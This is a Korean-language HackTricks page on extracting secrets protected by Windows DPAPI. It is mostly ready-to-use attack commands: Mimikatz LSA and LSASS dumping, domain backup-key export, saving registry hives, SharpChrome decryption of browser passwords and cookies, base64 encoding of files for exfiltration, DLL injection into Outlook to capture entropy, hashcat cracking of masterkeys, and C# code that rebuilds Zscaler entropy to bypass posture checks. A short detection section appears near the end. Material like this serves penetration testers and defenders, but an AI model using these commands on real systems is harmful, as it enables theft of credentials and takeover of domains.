# DPAPI - Password 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란

Data Protection API(DPAPI)는 주로 Windows 운영 체제에서 **비대칭 private key의 대칭 암호화**에 사용되며, 사용자 또는 시스템 secret을 중요한 entropy source로 활용합니다. 이 방식은 사용자의 logon secret에서 파생된 key를 사용하거나, 시스템 암호화의 경우 시스템의 domain authentication secret을 사용하여 데이터를 암호화할 수 있도록 함으로써 개발자의 암호화를 단순화합니다. 따라서 개발자가 암호화 key 자체의 보호를 직접 관리할 필요가 없습니다.

DPAPI를 사용하는 가장 일반적인 방법은 **`CryptProtectData` 및 `CryptUnprotectData`** 함수를 사용하는 것입니다. 이 함수들은 현재 logon된 process의 security context를 사용하여 application이 데이터를 암호화하고 복호화할 수 있도록 합니다. 기본적으로 데이터는 해당 데이터를 암호화한 동일한 user 또는 system context에서만 복호화할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>

이 함수들은 암호화 및 복호화 중에 사용되는 선택적 **entropy parameter**도 허용합니다. 선택적 entropy로 보호된 데이터는 복호화할 때 동일한 entropy value가 필요합니다.<sup>[[2]](#references)[[6]](#references)</sup>

### User key generation

DPAPI는 사용자의 credential에서 user-specific value(일반적으로 **pre-key**라고 함)를 파생합니다. 정확한 derivation 방식은 account와 operating-system version에 따라 달라집니다. 예를 들어 Impacket은 password의 SHA-1 digest를 기반으로 하는 HMAC-SHA1 경로, password의 MD4/NT hash를 기반으로 하는 또 다른 경로, 그리고 Protected Users용 PBKDF2-SHA256-derived 경로를 시도합니다. 따라서 offline tooling은 plaintext password 또는 사용 가능한 NT hash 중 하나에서 필요한 material을 파생할 수 있습니다.<sup>[[2]](#references)[[10]](#references)</sup>

이는 attacker가 사용자의 password hash를 획득할 수 있는 경우 다음을 수행할 수 있기 때문에 특히 중요합니다.

- 해당 user의 key로 **DPAPI를 사용해 암호화된 모든 데이터를 복호화**할 수 있으며, 어떤 API에도 contact할 필요가 없습니다.
- 유효한 DPAPI key 생성을 시도하면서 offline에서 **password를 crack**할 수 있습니다.

DPAPI는 보호된 각 blob마다 새로운 master key를 생성하는 대신, 각 user에 대해 하나 이상의 **master key**를 유지합니다. 각 master key에는 **GUID**(Globally Unique Identifier)가 있으며, 암호화된 blob에는 해당 blob을 보호하는 master key가 기록됩니다.<sup>[[2]](#references)</sup>

Master key는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory에 저장되며, 여기서 `{SID}`는 사용자의 Security Identifier입니다. Master-key file에는 사용자의 **pre-key**로 보호되는 material과 domain user의 경우 **domain backup key**로 보호되는 recovery material이 포함됩니다.<sup>[[2]](#references)</sup>

**master key를 암호화하는 데 사용되는 domain key는 domain controller에 있으며 절대 변경되지 않는다**는 점에 유의해야 합니다. 따라서 attacker가 domain controller에 access할 수 있다면 domain backup key를 가져와 해당 domain의 모든 user에 대한 master key를 복호화할 수 있습니다.<sup>[[2]](#references)</sup>

암호화된 blob은 header 내부에 데이터를 암호화하는 데 사용된 **master key의 GUID**를 포함합니다.

> [!TIP]
> DPAPI encrypted blob은 **`01 00 00 00`**으로 시작합니다.

Master key 찾기:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
사용자의 Master Keys가 여러 개 있을 때 다음과 같은 형태입니다:

![DPAPI란 무엇인가 - 사용자 키 생성: 사용자의 Master Keys가 여러 개 있을 때 다음과 같은 형태입니다](<../../images/image (1121).png>)

### Machine/System key 생성

이는 machine이 데이터를 암호화하는 데 사용하는 key입니다. **DPAPI_SYSTEM LSA secret**을 기반으로 하며, 이는 SYSTEM user만 access할 수 있는 특수한 key입니다. 이 key는 machine-level credentials 또는 system-wide secrets와 같이 system 자체에서 access해야 하는 데이터를 암호화하는 데 사용됩니다.<sup>[[2]](#references)</sup>

이러한 key에는 **domain backup이 없으므로** 로컬에서만 access할 수 있습니다:

- **Mimikatz**는 다음 command를 사용해 LSA secrets를 dump하여 access할 수 있습니다: `mimikatz lsadump::secrets`
- 이 secret은 registry 내부에 저장되므로, administrator는 **access할 수 있도록 DACL permissions를 수정할 수 있습니다**. registry path는 다음과 같습니다: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives에서 offline extraction을 수행하는 것도 가능합니다. 예를 들어, target의 administrator로서 hives를 저장하고 exfiltrate합니다:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
그런 다음 analysis box에서 hives로부터 DPAPI_SYSTEM LSA secret을 복구하고, 이를 사용해 machine-scope blobs(예약된 작업의 passwords, service credentials, Wi-Fi profiles 등)를 decrypt합니다:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI로 보호되는 데이터

DPAPI로 보호되는 개인 데이터는 다음과 같습니다.

- Windows 자격 증명
- Internet Explorer 및 Google Chrome의 비밀번호와 자동 완성 데이터
- Outlook 및 Windows Mail과 같은 애플리케이션의 이메일 및 내부 FTP 계정 비밀번호
- 공유 폴더, 리소스, 무선 네트워크 및 Windows Vault의 비밀번호와 암호화 키
- 원격 데스크톱 연결 및 .NET Passport의 비밀번호, 다양한 암호화 및 인증 용도의 개인 키
- Credential Manager에서 관리하는 네트워크 비밀번호와 Skype, MSN messenger 등 CryptProtectData를 사용하는 애플리케이션의 개인 데이터
- 레지스트리 내부의 암호화된 blob
- ...

시스템에서 보호되는 데이터에는 다음이 포함됩니다.
- Wifi 비밀번호
- 예약된 작업 비밀번호
- ...

### 마스터 키 추출 옵션

- 사용자가 domain admin 권한을 보유한 경우 **domain backup key**에 액세스하여 도메인의 모든 사용자 마스터 키를 복호화할 수 있습니다.
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 로컬 관리자 권한이 있으면 **LSASS 메모리에 접근**하여 연결된 모든 사용자의 DPAPI master keys와 SYSTEM key를 추출할 수 있습니다.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 사용자에게 로컬 관리자 권한이 있으면 **DPAPI_SYSTEM LSA secret**에 액세스하여 머신 master keys를 복호화할 수 있습니다:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 사용자의 password 또는 NTLM hash를 알고 있다면 **사용자의 master keys를 직접 decrypt할 수 있습니다**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 사용자가 세션 내에 있다면, **RPC를 사용해 master keys를 복호화할 backup key를 DC에 요청**할 수 있습니다. 사용자가 로그인한 상태이고 local admin이라면, 이를 위해 사용자의 **session token을 탈취**할 수 있습니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault 목록화
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 암호화 데이터에 액세스

### DPAPI 암호화 데이터 찾기

일반 사용자가 **보호한 파일**은 다음 위치에 있습니다.

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위 경로에서 `\Roaming\`을 `\Local\`로 변경한 경로도 확인합니다.

열거 예시:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)는 파일 시스템, 레지스트리 및 B64 blobs에서 DPAPI로 암호화된 blob을 찾을 수 있습니다:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
동일한 repo에 있는 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)를 사용하면 cookies와 같은 DPAPI 민감 데이터를 decrypt할 수 있습니다.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron 빠른 레시피 (SharpChrome)

- 현재 user, 저장된 logins/cookies의 interactive decryption (user context에서 실행할 때 사용자의 Credential Manager에서 추가 key가 resolve되므로 Chrome 127+ app-bound cookies에서도 작동):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 파일만 가지고 있는 경우의 Offline analysis. 먼저 프로필의 "Local State"에서 AES state key를 추출한 다음, 이를 사용해 cookie DB를 decrypt합니다:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key(PVK)와 대상 호스트의 admin 권한이 있을 때의 domain-wide/remote triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 사용자의 DPAPI prekey/credkey(LSASS에서 가져온 것)가 있다면 password cracking을 건너뛰고 profile data를 직접 decrypt할 수 있습니다:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
참고
- 최신 Chrome/Edge 빌드는 특정 cookies를 "App-Bound" encryption으로 저장할 수 있습니다. 추가적인 app-bound key 없이는 해당 cookies를 Offline decryption할 수 없으므로, 대상 사용자의 context에서 SharpChrome을 실행하여 자동으로 가져오세요. 아래에 참조된 Chrome security blog post를 확인하세요.<sup>[[5]](#references)</sup>

### 액세스 키 및 데이터

- **SharpDPAPI를 사용하여** 현재 session의 DPAPI encrypted files에서 credentials를 가져옵니다:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **자격 증명 정보 획득**: 암호화된 데이터와 guidMasterKey 같은 정보.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeys 액세스**:

RPC를 사용하여 **domain backup key**를 요청하는 사용자의 masterkey를 복호화합니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** 도구는 masterkey 복호화를 위해 다음 인수도 지원합니다(`/rpc`를 사용해 도메인 백업 키를 가져오거나, `/password`를 사용해 평문 비밀번호를 지정하거나, `/pvk`를 사용해 DPAPI 도메인 개인 키 파일을 지정할 수 있다는 점에 유의하세요...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey를 사용하여 데이터 복호화**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** 도구는 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화를 위해 다음 인자도 지원합니다(`/rpc`를 사용해 도메인 백업 키를 가져오고, `/password`를 사용해 평문 비밀번호를 사용하며, `/pvk`를 사용해 DPAPI 도메인 개인 키 파일을 지정하고, `/unprotect`를 사용해 현재 사용자의 세션을 사용하는 것이 가능하다는 점에 유의하세요...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey를 직접 사용하기(비밀번호 불필요)

LSASS를 dump할 수 있다면 Mimikatz는 일반적으로 평문 비밀번호를 몰라도 사용자의 masterkey를 복호화하는 데 사용할 수 있는 로그온별 DPAPI 키를 노출합니다. 이 값을 tooling에 직접 전달합니다:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **현재 사용자 세션**을 사용하여 일부 데이터를 복호화:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py를 사용한 오프라인 복호화

피해자 사용자의 SID와 password(또는 NT hash)가 있으면 Impacket의 dpapi.py를 사용하여 DPAPI masterkey와 Credential Manager blob을 완전히 오프라인에서 복호화할 수 있습니다.<sup>[[10]](#references)[[11]](#references)</sup>

- 디스크에서 artefact 식별:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- 일치하는 masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 파일 전송 tooling이 불안정하면 호스트에서 파일을 base64로 인코딩한 뒤 출력을 복사:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 사용자의 SID 및 password/hash로 masterkey를 복호화합니다:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 복호화된 masterkey를 사용하여 credential blob을 복호화합니다:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
이 workflow는 Windows Credential Manager를 사용하는 앱에 저장된 domain credentials를 자주 복구하며, administrative accounts(예: `*_adm`)도 포함됩니다.

---

### Optional Entropy("Third-party entropy") 처리

일부 애플리케이션은 `CryptProtectData`에 추가 **entropy** 값을 전달합니다. 이 값이 없으면 올바른 masterkey를 알고 있더라도 blob을 decrypt할 수 없습니다. 따라서 이러한 방식으로 보호된 credentials(예: Microsoft Outlook, 일부 VPN clients)를 대상으로 할 때는 entropy를 확보하는 것이 필수적입니다.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)(2022)는 target process 내부의 DPAPI functions에 hook을 설치하고, 전달되는 모든 optional entropy를 투명하게 기록하는 user-mode DLL입니다. `outlook.exe` 또는 `vpnclient.exe`와 같은 processes를 대상으로 EntropyCapture를 **DLL-injection** mode로 실행하면 각 entropy buffer를 호출한 process 및 blob과 매핑한 file이 출력됩니다. 이후 캡처한 entropy를 **SharpDPAPI**(`/entropy:`) 또는 **Mimikatz**(`/entropy:<file>`)에 전달하여 data를 decrypt할 수 있습니다.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### 오프라인에서 masterkey 크래킹 (Hashcat & DPAPISnoop)

Microsoft는 Windows 10 v1607(2016)부터 **context 3** masterkey 형식을 도입했습니다. `hashcat` v6.2.6(2023년 12월)은 hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) 및 **22102** (context 3)을 추가하여 masterkey 파일에서 직접 사용자 비밀번호를 GPU-accelerated cracking할 수 있도록 했습니다. 따라서 공격자는 target system과 상호작용하지 않고도 word-list 또는 brute-force attacks를 수행할 수 있습니다.<sup>[[7]](#references)</sup>

`DPAPISnoop`(2024)은 이 과정을 자동화합니다:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
이 도구는 Credential 및 Vault blobs를 파싱하고, cracked keys로 이를 복호화한 다음 평문 비밀번호를 export할 수도 있습니다.<sup>[[8]](#references)</sup>


### 다른 머신 데이터에 액세스

**SharpDPAPI 및 SharpChrome**에서는 **`/server:HOST`** 옵션을 지정하여 원격 머신의 데이터에 액세스할 수 있습니다. 물론 해당 머신에 액세스할 수 있어야 하며, 다음 예에서는 **domain backup encryption key를 알고 있다**고 가정합니다:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)은 LDAP directory에서 모든 users와 computers를 자동으로 추출하고 RPC를 통해 domain controller backup key를 추출하는 tool입니다. 그런 다음 script는 모든 computers의 IP address를 확인하고 모든 computers에서 smbclient를 수행하여 모든 users의 DPAPI blobs를 가져온 후 domain backup key로 모든 항목을 decrypt합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 computers list를 사용하면 미리 알지 못했던 경우에도 모든 sub network를 찾을 수 있습니다!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호된 secrets를 자동으로 dump할 수 있습니다. 2.x release에서는 다음 기능이 추가되었습니다:<sup>[[9]](#references)</sup>

* 수백 개 host에서 blobs를 parallel collection
* **context 3** masterkeys parsing 및 자동 Hashcat cracking integration
* Chrome "App-Bound" encrypted cookies 지원 (다음 section 참조)
* endpoint를 반복적으로 poll하고 새로 생성된 blobs를 diff하는 새로운 **`--snapshot`** mode

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop)은 masterkey/credential/vault files를 parsing하여 Hashcat/JtR formats로 출력하고, 선택적으로 cracking을 자동으로 실행할 수 있는 C# parser입니다. Windows 11 24H1까지의 machine 및 user masterkey formats를 완전히 지원합니다.<sup>[[8]](#references)</sup>


## 일반적인 탐지 항목

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 directories의 files에 대한 access
- 특히 **C$** 또는 **ADMIN$**와 같은 network share를 통한 access
- LSASS memory에 access하거나 masterkeys를 dump하기 위한 **Mimikatz**, **SharpDPAPI** 또는 유사 tooling 사용
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** object에 대한 access와 correlation 가능
- process가 *SeTrustedCredManAccessPrivilege* (Credential Manager)를 요청할 때의 Event **4673/4674**

---
### 2023-2025 vulnerabilities 및 ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023년 11월). Network access 권한이 있는 attacker는 domain member가 malicious DPAPI backup key를 가져오도록 속일 수 있으며, 이를 통해 user masterkeys를 decrypt할 수 있습니다. 2023년 11월 cumulative update에서 patch되었으므로 administrators는 DCs와 workstations가 최신 patch 상태인지 확인해야 합니다.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (2024년 7월)은 legacy DPAPI-only protection을 user의 **Credential Manager**에 저장되는 추가 key로 대체했습니다. 이제 cookies를 offline decrypt하려면 DPAPI masterkey와 **GCM-wrapped app-bound key**가 모두 필요합니다. SharpChrome v2.3 및 DonPAPI 2.x는 user context로 실행할 때 추가 key를 recover할 수 있습니다.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID에서 파생된 Custom Entropy

Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 configuration files(예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)를 저장합니다. 각 file은 **DPAPI (Machine scope)**로 encrypted되지만, vendor는 disk에 저장하지 않고 *runtime에 계산되는* **custom entropy**를 제공합니다.<sup>[[1]](#references)</sup>

Entropy는 다음 두 요소로부터 rebuild됩니다.

1. `ZSACredentialProvider.dll` 내부에 embedded된 hard-coded secret
2. configuration이 속한 Windows account의 **SID**

DLL에 구현된 algorithm은 다음과 같습니다:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
시크릿이 디스크에서 읽을 수 있는 DLL에 내장되어 있으므로, **SYSTEM 권한을 가진 모든 로컬 공격자는 어떤 SID에 대해서든 entropy를 재생성하고 blob을 오프라인에서 decrypt할 수 있습니다:**
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
복호화하면 모든 **device posture check**와 해당 예상 값을 포함한 전체 JSON configuration을 얻을 수 있습니다. 이는 client-side bypass를 시도할 때 매우 중요한 정보입니다.

> TIP: 다른 암호화된 artefact(`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 entropy 없이(`16`개의 0 바이트) DPAPI로 보호됩니다. 따라서 SYSTEM 권한을 획득하면 `ProtectedData.Unprotect`를 사용해 직접 복호화할 수 있습니다.

## References

- [1] [Synacktiv – zero trust를 신뢰해야 할까요? Zscaler posture check 우회](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI의 보안 분석 및 데이터 복구](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz와 C++를 사용한 DPAPI 암호화 Secret 읽기](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing 취약점](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows에서 Chrome 쿠키의 보안 강화](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy의 간단한 추출](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 릴리스 노트](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking 및 DPAPI 복호화를 통한 DC admin 권한 획득](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – 사용법 및 옵션](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
